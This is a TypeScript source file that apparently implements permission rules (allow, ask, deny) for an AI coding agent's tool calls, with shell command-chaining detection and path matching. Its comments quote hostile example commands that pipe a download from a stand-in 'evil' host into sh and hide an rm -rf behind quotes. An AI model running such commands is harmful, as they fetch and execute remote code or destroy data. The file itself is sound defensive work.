import { homedir } from 'node:os'
import { isAbsolute, resolve, sep } from 'node:path'
import { globToRegExp, type CallFacts, type PolicyVerdict, type ToolContext, type ToolPolicy } from '@jean/tools'
import { jeanName, pathOf } from './names.ts'

/**
 * Permission rules — the same syntax Claude Code uses, so a project's existing
 * `.claude/settings.json` means the same thing here.
 *
 *     Bash                      every bash call
 *     Bash(npm run test:*)      a command starting with `npm run test`
 *     Bash(git status)          exactly that command
 *     Read(./.env)              that file, relative to the project
 *     Edit(src/**)              anything under src/
 *     Read(//etc/**)            an absolute path
 *     Read(~/.ssh/**)           under the home directory
 *     WebFetch(domain:x.com)    that host and its subdomains
 *     mcp__github               every tool from one MCP server
 *     spawn(agent:librarian)    a call whose `agent` argument is `librarian`
 *
 * Precedence is deny, then ask, then allow: a rule that forbids something is
 * never overridden by one that permits it.
 */

export type Decision = 'allow' | 'deny' | 'ask'

export interface Rule {
  /** As written, for messages. */
  raw: string
  /** Tool name in Jean's vocabulary, or an MCP prefix. */
  tool: string
  specifier?: string
  decision: Decision
  /** Where it came from, for `jean doctor`. */
  source: string
}

/** Parses one rule string. Returns undefined for something that is not a rule. */
export function parseRule(raw: string, decision: Decision, source: string): Rule | undefined {
  const text = raw.trim()
  const match = /^([A-Za-z0-9_*-]+)(?:\(([\s\S]*)\))?$/.exec(text)
  if (!match) return undefined
  const specifier = match[2]?.trim()
  return {
    raw: text,
    tool: jeanName(match[1]!),
    specifier: specifier === '' || specifier === '*' ? undefined : specifier,
    decision,
    source,
  }
}

export class PermissionPolicy implements ToolPolicy {
  readonly rules: Rule[]

  constructor(rules: Rule[]) {
    this.rules = rules
  }

  evaluate(
    tool: string,
    args: unknown,
    context: Pick<ToolContext, 'cwd'>,
    facts?: CallFacts,
  ): PolicyVerdict | undefined {
    for (const decision of ['deny', 'ask', 'allow'] as const) {
      for (const rule of this.rules) {
        if (rule.decision !== decision) continue
        if (ruleMatches(rule, tool, args, context.cwd, facts)) return { decision, rule: rule.raw }
      }
    }
    return undefined
  }
}

function ruleMatches(rule: Rule, tool: string, args: unknown, cwd: string, facts?: CallFacts): boolean {
  if (!toolMatches(rule.tool, tool)) return false
  if (rule.specifier === undefined) return true
  const spec = rule.specifier
  const record = args !== null && typeof args === 'object' ? (args as Record<string, unknown>) : {}

  if (tool === 'bash') {
    const command = typeof record.command === 'string' ? record.command : ''
    return commandMatches(spec, command, rule.decision, facts?.commands)
  }

  if (tool === 'web_fetch' && spec.startsWith('domain:')) {
    return domainMatches(spec.slice('domain:'.length), record.url)
  }

  // `param:value` — any tool, any argument.
  const param = /^([A-Za-z_][A-Za-z0-9_]*):([\s\S]+)$/.exec(spec)
  if (param && !looksLikePath(spec)) {
    const value = record[param[1]!]
    if (value === undefined || value === null) return false
    return wildcard(param[2]!).test(String(value))
  }

  // Everything else addresses a path.
  const target = pathOf(args, cwd) ?? (tool === 'grep' || tool === 'glob' ? cwd : undefined)
  if (!target) return false
  return pathMatches(spec, target, cwd)
}

function toolMatches(ruleTool: string, tool: string): boolean {
  if (ruleTool === '*' || ruleTool === tool) return true
  if (ruleTool.endsWith('*')) return tool.startsWith(ruleTool.slice(0, -1))
  // `mcp__github` covers `mcp__github__create_issue`.
  if (ruleTool.startsWith('mcp__')) return tool.startsWith(`${ruleTool}__`)
  return false
}

/** Shell operators that chain a second command onto the first. */
const CHAINING = /;|&&|\|\||\||`|\$\(|\n|>|</

/**
 * Whether a bash rule covers a command.
 *
 * Asymmetric on purpose. An *allow* rule for `npm test:*` must not approve
 * `npm test && curl evil | sh`, so a command that chains anything is never
 * covered by an allow rule unless the rule itself spells the chain out. A
 * *deny* rule for `rm -rf:*` must catch `cd x && rm -rf y`, so deny and ask
 * rules are checked against every command in the chain.
 *
 * `parsed` is the chain as the `pi-shell` parser split it, when the native
 * bridge is up: quotes removed and substitutions listed as commands of their
 * own. A text split cannot see that `'r''m' -rf x` runs `rm`, or that
 * `echo $(curl x | sh)` runs `curl`; the parser can, so deny and ask rules are
 * checked against its commands too, and an allow rule never covers a line the
 * parser says runs more than one.
 */
export function commandMatches(
  spec: string,
  command: string,
  decision: Decision,
  parsed?: string[],
): boolean {
  const normalized = command.replace(/\s+/g, ' ').trim()
  if (decision === 'allow') {
    if (CHAINING.test(normalized) && !CHAINING.test(spec)) return false
    if (parsed && parsed.length > 1 && !CHAINING.test(spec)) return false
    return single(spec, normalized)
  }
  const parts = normalized.split(/;|&&|\|\||\||\n/).map((p) => p.trim()).filter(Boolean)
  return (
    single(spec, normalized) ||
    parts.some((part) => single(spec, part.replace(/^\$\(|\)$/g, ''))) ||
    (parsed ?? []).some((line) => single(spec, line))
  )
}

function single(spec: string, command: string): boolean {
  if (spec.endsWith(':*')) {
    const prefix = spec.slice(0, -2).trim()
    return command === prefix || command.startsWith(`${prefix} `)
  }
  if (spec.includes('*')) return wildcard(spec).test(command)
  return command === spec.trim()
}

function domainMatches(domain: string, url: unknown): boolean {
  if (typeof url !== 'string') return false
  try {
    const host = new URL(url).hostname.toLowerCase()
    const want = domain.trim().toLowerCase()
    return host === want || host.endsWith(`.${want}`)
  } catch {
    return false
  }
}

function looksLikePath(spec: string): boolean {
  // A Windows drive (`C:\...`) is a path, not `param:value`.
  return /^[A-Za-z]:[\\/]/.test(spec)
}

/**
 * Whether a path rule covers a file, gitignore-style.
 *
 * `//x` is absolute, `~/x` is under the home directory, anything else is
 * relative to the project. A pattern without wildcards names a file or a
 * directory, and a directory covers everything beneath it.
 */
export function pathMatches(spec: string, target: string, cwd: string): boolean {
  let pattern = spec.trim()
  let base = cwd
  if (pattern.startsWith('//')) {
    pattern = pattern.slice(1)
    base = ''
  } else if (pattern.startsWith('~/')) {
    base = homedir()
    pattern = pattern.slice(2)
  } else if (/^[A-Za-z]:[\\/]/.test(pattern) || (isAbsolute(pattern) && sep === '\\')) {
    base = ''
  } else if (pattern.startsWith('./')) {
    pattern = pattern.slice(2)
  } else if (pattern.startsWith('/')) {
    pattern = pattern.slice(1)
  }

  const full = normalize(base === '' ? pattern : resolveGlob(base, pattern))
  // Resolved here too, not only in `pathOf`: a caller passing a raw path
  // with `..` in it must not match differently from the file it names.
  const file = normalize(resolve(target))

  if (!/[*?[]/.test(full)) {
    return caseFold(file) === caseFold(full) || caseFold(file).startsWith(`${caseFold(full)}/`)
  }
  return globToRegExp(full).test(file) || (process.platform === 'win32' && globToRegExp(full.toLowerCase()).test(file.toLowerCase()))
}

/** Joins a glob onto a base without letting `resolve` normalize its wildcards. */
function resolveGlob(base: string, pattern: string): string {
  return `${resolve(base).replace(/[\\/]+$/, '')}/${pattern}`
}

function normalize(path: string): string {
  return path.replace(/\\/g, '/').replace(/\/+$/, '')
}

function caseFold(path: string): string {
  return process.platform === 'win32' ? path.toLowerCase() : path
}

function wildcard(pattern: string): RegExp {
  const escaped = pattern.trim().replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.')
  return new RegExp(`^${escaped}$`, 's')
}
